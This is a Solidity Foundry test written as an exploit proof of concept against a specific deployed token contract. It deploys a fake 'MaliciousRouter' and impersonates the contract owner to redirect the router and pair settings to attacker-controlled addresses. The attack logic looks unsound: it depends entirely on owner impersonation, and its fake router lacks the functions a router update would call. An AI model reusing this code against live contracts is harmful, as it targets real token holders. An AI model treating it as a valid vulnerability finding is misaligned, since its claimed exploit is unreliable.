// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICoinToken {
    function updateUniswapV2Router(address newAddress) external;
    function setAutomatedMarketMakerPair(address pair, bool value) external;
    function uniswapV2Pair() external view returns (address);
    function owner() external view returns (address);
}

// Malicious router contract
contract MaliciousRouter {
    address public factoryAddress;
    address public wethAddress;

    constructor() {
        factoryAddress = address(this); // Return self as factory
        wethAddress = address(this);    // Return self as WETH
    }

    // Minimal implementation to satisfy interface
    function factory() external view returns (address) {
        return factoryAddress;
    }

    function WETH() external view returns (address) {
        return wethAddress;
    }

    // Other functions can be empty or revert
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint, uint, uint) {
        return (0, 0, 0);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xa79C1D3A0F0a21eC5B0Ee2f96685aaCfaCc95dFb;
    address attacker = address(this);
    address public maliciousRouter;
    address public attackerPair = address(0x1337);
    address public owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious contracts
        maliciousRouter = address(new MaliciousRouter());
        attackerPair = address(0x1337); // Any address we control

        // Label for clarity
        vm.label(address(maliciousRouter), "MaliciousRouter");
        vm.label(attackerPair, "AttackerPair");

        // Get the owner
        getOwner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Update router to malicious router
        vm.prank(owner);
        ICoinToken(TARGET).updateUniswapV2Router(address(maliciousRouter));

        // Step 2: Set automated market maker pair to attacker-controlled address
        vm.prank(owner);
        ICoinToken(TARGET).setAutomatedMarketMakerPair(attackerPair, true);

        // Verify the exploit worked
        address newPair = ICoinToken(TARGET).uniswapV2Pair();
        require(newPair == attackerPair, "Exploit failed: uniswapV2Pair not set to attacker address");

        console.log("Success! uniswapV2Pair is now:", newPair);
        assertEq(ICoinToken(TARGET).uniswapV2Pair(), attackerPair, "Logic Exploit Failed: State not tampered");
    }

    // Helper to get owner
    function getOwner() internal {
        owner = ICoinToken(TARGET).owner();
    }

    // Receive function for ETH
    receive() external payable {}
}
